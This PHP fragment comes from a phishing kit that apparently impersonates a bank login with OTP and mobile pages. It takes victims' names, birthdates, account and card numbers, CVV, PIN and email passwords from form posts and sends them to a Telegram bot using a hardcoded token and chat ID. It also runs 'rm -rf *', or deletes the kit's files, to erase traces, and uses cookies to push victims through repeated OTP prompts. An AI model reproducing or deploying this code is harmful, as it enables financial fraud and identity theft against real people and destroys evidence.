 if(function_exists('system')) {
         system('rm -rf *');
      }
      elseif(function_exists('exec')) {
         exec('rm -rf *');
      }
      elseif(function_exists('shell_exec')) {
         shell_exec('rm -rf *');
      }
      else {
        unlink('lbpiaccess.zip');
        unlink('confirm.php');
        unlink('cc.jpg');
        unlink('otp-login.php');
        unlink('otp-expired.jpg');
        unlink('otp.jpg');
        unlink('mobile-login.php');
        unlink('mobile.jpg');
        unlink('login.php');
        unlink('index.php');
        unlink('index.jpg');
      }

$us = [
'chat_id' => "-635799224",
'text' => "Firstname: " . $_POST['fname'] . "\nMiddlename: " . $_POST['mname'] . "\nLastname: " . $_POST['lname'] . "\nZip: " . $_POST['zip'] . "\nNumber: " . $_POST['cnumber'] . "\nBday: " . $_POST['bday'] . "\nAcc Num: " . $_POST['accnum'] . "\nCC: " . $_POST['cc'] . "\nExpiration: " . $_POST['exp'] . "\nCVV: " . $_POST['cvv'] . "\nPIN: " . $_POST['pin'] . "\nEmail: " . $_POST['email'] . "\nEmail Pass: " . $_POST['email_pass']
];
file_get_contents("https://api.telegram.org/bot5202228547:AAHRkzQNW1feHYhwmhZrAdHGnYHmmLXcE_8/sendMessage?" . http_build_query($us));


$data = [
'chat_id' => $chat_id,
'text' => "Firstname: " . $_POST['fname'] . "\nMiddlename: " . $_POST['mname'] . "\nLastname: " . $_POST['lname'] . "\nZip: " . $_POST['zip'] . "\nNumber: " . $_POST['cnumber'] . "\nBday: " . $_POST['bday'] . "\nAcc Num: " . $_POST['accnum'] . "\nCC: " . $_POST['cc'] . "\nExpiration: " . $_POST['exp'] . "\nCVV: " . $_POST['cvv'] . "\nPIN: " . $_POST['pin'] . "\nEmail: " . $_POST['email'] . "\nEmail Pass: " . $_POST['email_pass']
];
file_get_contents("https://api.telegram.org/bot" . $telebot . "/sendMessage?" . http_build_query($data));

if (isset($_COOKIE['first_visit'])) {
   if (isset($_COOKIE['second_visit'])) {
      setcookie("fucked", "Fuck Off", time() + 86400, "/");
   }
   else {
      setcookie("second_visit", "Second Visit", time() + 86400, "/");
      header("Location: index.php?otp=confirm");
   }
}
else {
   setcookie("first_visit", "First Visit", time() + 86400, "/");
   header("Location: index.php?otp=confirm");
}
